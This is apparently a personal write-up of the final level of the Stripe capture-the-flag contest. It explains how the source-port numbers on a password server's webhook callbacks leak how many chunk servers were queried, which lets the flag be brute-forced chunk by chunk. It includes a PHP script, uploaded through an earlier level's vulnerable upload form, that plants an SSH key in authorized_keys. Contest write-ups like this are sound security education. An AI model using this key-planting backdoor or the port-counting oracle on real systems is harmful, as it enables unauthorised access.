Level 8 Notes (level08)
=======================

This level involves a piece of software called PasswordDB - a distributed password validation system.

This level is interesting in that it's the first which actually requires running a program which does a significant amount of work for you and which couldn't simply be replicated by hand easily.

It's also the final level. :)

Starting out
------------

The first thing to note is that there's a lot of code, and actually 5 servers that run:

* Primary server (primary_server)
* Chunk server A (chunk_server)
* Chunk server B (chunk_server)
* Chunk server C (chunk_server)
* Chunk server D (chunk_server)

All servers accept HTTP queries. The primary server is the only server visible to the attacker. The primary server has "webhook" support, where it'll call you back with the same information as it returns in the HTTP response.

What's the vulnerability then?
------------------------------

The primary server is specifically designed to prevent (well, make difficult) timing attacks for the following vulnerability.

When the primary server checks the flag, it does so in the following pseudocode:

```python
servers = ['chunk_server_a', 'chunk_server_b', 'chunk_server_c', 'chunk_server_d']
chunked_code = split_into_chunks(input, len(servers))
for chunk in chunked_code:
	if not ask_server(servers.pop(0), chunk): # if the server says the code is wrong
		prevent_timing_attacks() # do a little sleep to discourage timing attacks
		return False # stop immediately
return True
```

It's important to note that the primary server will only ask the minimum number of chunk servers required to find out if a flag is invalid.
This is key.

If your entire flag is correct, then this happens:

1. PServer receives request
2. PServer splits into chunks
3. PServer queries CServer A (out 1)
4. CServer A responds saying it's OK
5. PServer queries CServer B (out 2)
6. CServer B responds saying it's OK
7. PServer queries CServer C (out 3)
8. CServer C responds saying it's OK
9. PServer queries CServer D (out 4)
10. CServer D responds saying it's OK
11. PServer pings each of your webhooks saying that it's OK
12. PServer responds to you saying it's OK and closes the connection

However, if only your first chunk is correct, this happens:

1. PServer receives request
2. PServer splits into chunks
3. PServer queries CServer A (out 1)
4. CServer A responds saying it's wrong
5. PServer sleeps for a bit
6. PServer pings each of your webhooks saying that it's wrong
7. PServer responds to you saying it's wrong and closes the connection

In this case, the PServer only makes one outbound connection.

How do you find out how many outbound connections it's made?
------------------------------------------------------------

Simple.

The TCP port that the PServer connects from, to your webhook.

To exploit this, you can do the following:

1. Open HTTP connection with, e.g. 122xxxxxxxxx as the password
2. PServer makes outbound connection to CServer A, it's wrong
3. PServer sleeps
4. PServer pings you back on your webhook
5. You record the PServer port number that the pingback came from
6. PServer closes HTTP connection
7. Open HTTP connection with 122xxxxxxxxx as the password again
8. PServer makes outbound connection to CServer A, it's wrong
9. PServer sleeps
10. PServer pings you back on your webhook
11. You record this new PServer port number and subtract the previous number
12. PServer closes HTTP connection

For the first chunk, the difference in port numbers is 2 for an invalid guess, and 3 for a valid guess.
Thus, you just keep trying until you get a 3.

But there's jitter!
-------------------

Jitter should only increase the port difference. If you don't get a 2, keep trying. My code stops after it gets several 3 responses.

Exploiting this in production
-----------------------------

First, you need access to SSH on a level2 server. You do this by going back to level2's vulnerable upload script, and uploading a script which lets you add your own SSH key to authorized_keys:
```php
<?php

$my_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl5m6cUBAIo9BUFRZjwWze68qN9xvrLRMs+OlAyoi3VTzT+QHnCeTkLUL/V2raCjrbtJGNOgANtJ7m+/17FxKQ9+MNPBiGCR7nPWJ2EQDSh8h4A5NWwwTdVPWBmlBN40d8ni6JjlXFm/D+hoBxUxaRBjYQpi5N9GpdDK4GAQHuSb3pJob+ANGeV4LvWBzmlCp6mZf63yljLtPMTXRT58XAe4D4kMUdh59tDpr9dmpsqPtxW/9fXJgQdgpa4kGrj+UkaPj+GkZemneUq6Ih200vZL90MIGzZcJ4as4EKtpXbfo8M+YMZ53i2RA1ZzEcrZ/77ls31l9GWBMEY91IwbbB lukegb@lukegb.com';

mkdir("../../.ssh");
chmod("../../.ssh", 0700);
file_put_contents("../../.ssh/authorized_keys", $my_key);
chmod("../../.ssh/authorized_keys", 0600);

?>
```

and then run that. You now have ssh access to user-__userstring__@level02-__servernumber__.stripe-ctf.com - hooray!

Next, you need to write a script to make outgoing calls to the PServer and receive webhooks and their associated outbound port numbers. I did this in Go, and you can find it in the level08 folder in this git repository.

Finally: run it!